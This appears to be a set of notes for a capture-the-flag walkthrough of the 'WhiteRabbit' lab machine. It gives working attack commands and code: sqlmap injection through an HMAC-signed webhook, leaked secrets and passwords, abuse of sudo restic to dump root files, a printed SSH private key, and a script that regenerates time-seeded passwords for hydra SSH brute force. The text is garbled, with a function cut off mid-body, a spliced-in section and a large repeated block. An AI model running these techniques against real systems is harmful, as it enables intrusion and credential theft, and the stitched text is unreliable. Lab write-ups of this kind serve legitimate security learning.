1 min![](Pasted%20image%2020251112180927.png)
found a vhosts with a login panel

However we couldn't find anything (lot of directory bruteforcing for both subdomains), so after a little bit of research:
However we couldn't find anything (lot of directory bruteforcing for both subdomains), so after a little bit of research:
This says that under /status/ endpoint, there might be some pages accessible for non authenticated users.

So we bruteforced this endpoint and found /status/temp/ that lists some new subdomains:
![](Pasted%20image%2020251112181927.png)
```
GoPhish -> ddb09a8558c9.whiterabbit.htb 
Wikijs -> a668910b5514e.whiterabbit.htb
```
If we read this post on Wikijs endpoint http://a668910b5514e.whiterabbit.htb/en/gophish_webhooks we can see that there is a webhook endpoint that talks to n8n subdomain 28efa8f7df.whiterabbit.htb

Interestingly: So this could be vulnerable to SQLI, however this endpoint requires x-gophish-signature header containing a HMAC Signature of the POST Request Body. However we don't have the key for HMAC Signature, but if we continue reading: We have attached a json file of a completed workflow where an invalid signature is provided gophish_to_phishing_score_database.json If we read http://a668910b5514e.whiterabbit.htb/gophish/gophish_to_phishing_score_database.js on we can find the secret key use for HMAC Signature:
Grep for secret
```
cat gophish_to_phishing_score_database.json | grep secret
        "secret": "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
```

To generate a hmac signature we can use cyberchef
	```https://gchq.github.io/CyberChef/#recipe=HMAC(%7B'option':'UTF8','string':'3CWVGMndgM vdVAzOjqBiTicmv7gxc6IS'%7D,'SHA256')&input=eyJjYW1wYWlnbl9pZCI6MiwiZW1haWwi OiJ0ZXN0XCIiLCJtZXNzYWdlIjoiQ2xpY2tlZCBMaW5rIn0&ieol=CRLF


this appears to be vulnerable using a payload like : 
```
{"campaign_id":2,"email":"test\"","message":"Clicked Link"}
```
we will use sqlmap and we will create a BurpSuite extension that will append the x-gophish-signature header along with the correct HMAC Signature automatically:

https://www.pentestpartners.com/security-blog/burp-hmac-header-extensions-a-how-to/
and the code we used :
https://github.com/pentestpartners/snippets/blob/master/hmac.py

however we need to modify it as our needs.
We can then use sqlmap to automate the attack: 
```
sqlmap -u http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34- 37bfc67dfd1d --method POST --data '{"campaign_id":2,"email":"test@mail.com","message":"Clicked Linka"}' -p email --proxy http://127.0.0.1:8080/ --batch --dump --level=5 --risk=3 -D temp -T command_log --f lush
```

We were able to dump the temp database, and its command_log table:
```
+----+---------------------+-------------------------------------------------- ----------------------------+ | id | date | command | +----+---------------------+-------------------------------------------------- ----------------------------+ | 1 | 2024-08-30 10:44:01 | uname -a | | 2 | 2024-08-30 11:58:05 | restic init --repo rest:http://75951e6ff.whiterabbit.htb | | 3 | 2024-08-30 11:58:36 | echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd | | 4 | 2024-08-30 11:59:02 | rm -rf .bash_history | | 5 | 2024-08-30 11:59:47 | #thatwasclose | | 6 | 2024-08-30 14:40:42 | cd /home/neo/ && /opt/neo-password-generator/neopassword-generator | passwd | +----+---------------------+-------------------------------------------------- ----------------------------+
```

We can see that there is a Restic repo on this subdomain http://75951e6ff.whiterabbit.htb , we can also see the password used for that repo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw .

interesting is this earlier commands :
```
2024-08-30 14:40:42 | cd /home/neo/ && /opt/neo-password-generator/neopassword-generator | passwd
```

At 2024-08-30 14:40:42 someone run the command /opt/neo-password-generator/neopassword-generator and piped it into passwd , in other words he changed his password to the one generated by /opt/neo-password-generator/neo-password-generator . This information is of no use for us in the meantime but will be useful later on so let's take a note of it. For now let's focus on the Restic repo, so we can access this repo and see if there are any backups to recover them:

```
## Export needed environment varaibles export RESTIC_PASSWORD=ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw export RESTIC_REPOSITORY=rest:http://75951e6ff.whiterabbit.htb ## Get a list of snapshots (backups) restic snapshots ## Restore a path from specific snapshot to current directory restic restore 272cacd5 --target . --path /dev/shm/bob/ssh ## Grab 7z hash of bob.7z file that we just recovered cd dev/shm/bob/ssh/ 7z2john bob.7z
```

We can see that there is an encrypted bob.7z file, so we can get a crackable format using 7z2john then crack the encryption using hashcat . Got hash for bob.7z :

```
bob.7z:$7z$2$19$0$$8$61d81f6f9997419d0000000000000000$4049814156$368$365$7295a 784b0a8cfa7d2b0a8a6f88b961c8351682f167ab77e7be565972b82576e7b5ddd25db30eb27137 078668756bf9dff5ca3a39ca4d9c7f264c19a58981981486a4ebb4a682f87620084c35abb66ac9 8f46fd691f6b7125ed87d58e3a37497942c3c6d956385483179536566502e598df3f63959cf16e a2d182f43213d73feff67bcb14a64e2ecf61f956e53e46b17d4e4bc06f536d43126eb4efd1f529 a2227ada8ea6e15dc5be271d60360ff5c816599f0962fc742174ff377e200250b835898263d997 d4ea3ed6c3fc21f64f5e54f263ebb464e809f9acf75950db488230514ee6ed92bd886d0a9303bc 535ca844d2d2f45532486256fbdc1f606cca1a4680d75fa058e82d89fd3911756d530f621e801d 73333a0f8419bd403350be99740603dedff4c35937b62a1668b5072d6454aad98ff491cb7b1632 78f8df3dd1e64bed2dac9417ca3edec072fb9ac0662a13d132d7aa93ff58592703ec5a556be2c0 f0c5a3861a32f221dcb36ff3cd713$399$00
```
after crack 
1q2w3e4r5t6y

After extracting the content, we can see a private SSH key for user bob which can SSH to the server listening on port 2222 :

ssh bob@whiterabbit.htb -i bob -p 2222

Running sudo -l we can see that user bob can run /usr/bin/restic as root. Remember restic is used to backup files into local/remote repo, so we might be able to abuse this behavior to backup the /root/ directory and then read its content:
```
## Init a new local repo sudo /usr/bin/restic init -r . ## Then input any pass u want and use that pass whenever they prompt u ## Backup the /root/ directory sudo restic -r . backup /root/ ## List the latest backup sudo restic -r . ls latest ## Dump /root/morpheus from the latest backup made sudo restic -r . dump latest /root/morpheus
```
content of /root/morpheus:
```
-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS 1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQS/TfMMhsru2K1PsCWvpv3v3Ulz5cBP UtRd9VW3U6sl0GWb0c9HR5rBMomfZgDSOtnpgv5sdTxGyidz8TqOxb0eAAAAqOeHErTnhx K0AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL9N8wyGyu7YrU+w Ja+m/e/dSXPlwE9S1F31VbdTqyXQZZvRz0dHmsEyiZ9mANI62emC/mx1PEbKJ3PxOo7FvR 4AAAAhAIUBairunTn6HZU/tHq+7dUjb5nqBF6dz5OOrLnwDaTfAAAADWZseEBibGFja2xp c3QBAg== -----END OPENSSH PRIVATE KEY-----
```

```
/root/morpheus is apparently the SSH private key for user morpheus on the main machine (Server on port 22 ), so we can now SSH as morpheus to the main machine and grab the user.txt .
```
Now we can focus on /opt/neo-password-generator/neo-password-generator we saw earlier. Since this appears to be a custom made binary, let's download a copy of it using scp to our local machine for further analysis:

using ghidra, the main function is simple and contains:
```
gettimeofday(&local_28,(__timezone_ptr_t)0x0); generate_password(local_28.tv_sec * 1000 + local_28.tv_usec / 1000);
```
So apparently it's getting the current the using it to generate a password. If we read the man page for gettimeofday() function in C:
```
https://man7.org/linux/man-pages/man2/gettimeofday.2.html
```
We can see that the first argument is a timeval struct:

```
struct timeval { time_t tv_sec; /* seconds */ suseconds_t tv_usec; /* microseconds */ };
```
This gives the number of seconds and microseconds since the Epoch (see time(2)).

And the second argument is a timezone struct, in our case it is passing NULL so we don't care about it. Then we are calling the custom function generate_password() and passing local_28.tv_sec * 1000 + local_28.tv_usec / 1000 as argument. 
Multiply the seconds by 1000 Divide the microseconds by 1000 Add both results

The generate_password() function is as follows:

```
void generate_password(unsigned int param_1)
{
    int iVar1;
    long in_FS_OFFSET;
    int local_34;
    char local_28[20];
    undefined local_14;
    long local_10;

    local_10 = *(long *)(in_FS_OFFSET + 0x28);
    srand(param_1);1 min![](Pasted%20image%2020251112180927.png)￼￼
It takes the first parameter as a seed for the rand() function, which will generate a random password based on that seed. This random number is then used by computing random % 62 ( 62 is 0x3e in hex) and appending the character of the index = random % 62 to the password. The final password length is 20 ( 20 is 0x14 in hex). We know that user neo has ran this binary at 2024-08-30 14:40:42 , so we know the exact number of seconds since the Epoch, however we don't know the number of microseconds, so we will need to bruteforce that number divided by 1000 , so from 0 to 999 (only 1000 possible values, since microsecond is 1000000 and divided by 1000 becomes 1000 ). Wrote a simple python script that will generate all the possible passwords:

```
#!/usr/bin/env python3
from ctypes import CDLL, c_uint, c_int
import datetime

# Use the system libc's rand/srand (C implementation)
libc = CDLL("libc.so.6")
libc.srand.argtypes = (c_uint,)
libc.srand.restype = None
libc.rand.argtypes = ()
libc.rand.restype = c_int

CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
PASSWORD_LEN = 20

# UTC timestamp for 2024-08-30 14:40:42
# tzinfo=datetime.timezone(datetime.timedelta(0)) -> used to specify UTC
​￼seconds = datetime.datetime(
    2024, 8, 30, 14, 40, 42, tzinfo=datetime.timezone(datetime.timedelta(0))
).timestamp()

# seconds is a float (seconds since epoch). We use milliseconds as seed base.
base_millis = int(seconds * 1000)

# Try microsecond/1000 values from 0..999 (as you described)
passwords = []
​￼for i in range(0, 1000):
    seed = c_uint(base_millis + i)
    libc.srand(seed)  # seed the C RNG

    password_chars = []
    ​￼for _ in range(PASSWORD_LEN):
        r = libc.rand()
        index = r % 62
        password_chars.append(CHARSET[index])

    password = "".join(password_chars)
    passwords.append((seed.value, password))
    print(seed.value, password)

# Optionally: remove duplicates (unlikely) and show count
# unique_passwords = {p for _, p in passwords}
# print(f"\nGenerated {len(passwords)} seeds, {len(unique_passwords)} unique passwords.")

```
Then we can bruteforce SSH passwords for neo user:

python3 pass_wordlist_generator.py > pass_list.txt hydra -l neo -P pass_list.txt ssh://whiterabbit.htb -t 20

password is :
```WBSxhWgfnMiclrV4dqfj
```

ssh as neo and run sudo su to become root and read root.txt flag
![](Pasted%20image%2020251112194821.png)


    for (local_34 = 0; local_34 < 0x14; local_34 = local_34 + 1) {
        iVar1 = rand();
        local_28[local_34] =
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
            [iVar1 % 0x3e];
    }

    local_14 = 0;
    puts(local_28);

    if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
        /* WARNING: Subroutine does not return */
        __stack_chk_fail();
    }

    return;
}
```
It takes the first parameter as a seed for the rand() function, which will generate a random password based on that seed. This random number is then used by computing random % 62 ( 62 is 0x3e in hex) and appending the character of the index = random % 62 to the password. The final password length is 20 ( 20 is 0x14 in hex). We know that user neo has ran this binary at 2024-08-30 14:40:42 , so we know the exact number of seconds since the Epoch, however we don't know the number of microseconds, so we will need to bruteforce that number divided by 1000 , so from 0 to 999 (only 1000 possible values, since microsecond is 1000000 and divided by 1000 becomes 1000 ). Wrote a simple python script that will generate all the possible passwords:

```
#!/usr/bin/env python3
from ctypes import CDLL, c_uint, c_int
import datetime

# Use the system libc's rand/srand (C implementation)
libc = CDLL("libc.so.6")
libc.srand.argtypes = (c_uint,)
libc.srand.restype = None
libc.rand.argtypes = ()
libc.rand.restype = c_int

CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
PASSWORD_LEN = 20

# UTC timestamp for 2024-08-30 14:40:42
# tzinfo=datetime.timezone(datetime.timedelta(0)) -> used to specify UTC
seconds = datetime.datetime(
    2024, 8, 30, 14, 40, 42, tzinfo=datetime.timezone(datetime.timedelta(0))
).timestamp()

# seconds is a float (seconds since epoch). We use milliseconds as seed base.
base_millis = int(seconds * 1000)

# Try microsecond/1000 values from 0..999 (as you described)
passwords = []
for i in range(0, 1000):
    seed = c_uint(base_millis + i)
    libc.srand(seed)  # seed the C RNG

    password_chars = []
    for _ in range(PASSWORD_LEN):
        r = libc.rand()
        index = r % 62
        password_chars.append(CHARSET[index])

    password = "".join(password_chars)
    passwords.append((seed.value, password))
    print(seed.value, password)

# Optionally: remove duplicates (unlikely) and show count
# unique_passwords = {p for _, p in passwords}
# print(f"\nGenerated {len(passwords)} seeds, {len(unique_passwords)} unique passwords.")

```
Then we can bruteforce SSH passwords for neo user:

python3 pass_wordlist_generator.py > pass_list.txt hydra -l neo -P pass_list.txt ssh://whiterabbit.htb -t 20

password is :
```WBSxhWgfnMiclrV4dqfj
```

ssh as neo and run sudo su to become root and read root.txt flag
![](Pasted%20image%2020251112194821.png)
